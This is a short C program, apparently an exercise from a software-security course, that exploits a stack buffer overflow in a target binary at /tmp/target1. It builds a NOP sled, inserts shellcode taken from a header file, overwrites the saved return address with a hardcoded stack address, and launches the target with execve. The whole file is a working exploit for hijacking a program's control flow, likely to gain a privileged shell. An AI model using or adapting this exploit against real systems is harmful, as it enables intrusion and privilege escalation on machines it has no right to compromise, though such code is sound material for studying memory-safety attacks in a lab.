#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
	// 256 bytes is the buffer, 2*sizeof(int) for ebp and eip, and 1 byte for
	// null terminator.
	char sploitstring[256 + 2 * sizeof(int) + 1];
	// Set all NOP.
	memset(sploitstring, '\x90', sizeof(sploitstring));
	// Set final null.
	sploitstring[sizeof(sploitstring) - 1] = 0;
	// We don't want shellcode to be null-terminated.
	memcpy(sploitstring, shellcode, sizeof(shellcode) - 1);
	// Past the buffer, past ebp, point to eip.
	int* ret = (int*)(sploitstring + 256 + sizeof(int));
	*ret = 0xbffffc5c;

	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
